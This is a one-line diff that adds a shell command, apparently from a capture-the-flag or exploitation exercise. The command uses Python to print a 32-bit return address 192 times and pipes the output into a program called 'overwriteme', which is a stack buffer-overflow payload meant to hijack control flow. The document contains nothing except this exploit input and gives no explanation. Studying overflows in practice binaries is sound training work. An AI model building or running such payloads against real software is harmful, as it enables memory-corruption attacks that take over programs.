@@ -1,0 +1,1 @@
+python -c 'print("\x8b\x87\x04\x08"*192)' | ./overwriteme
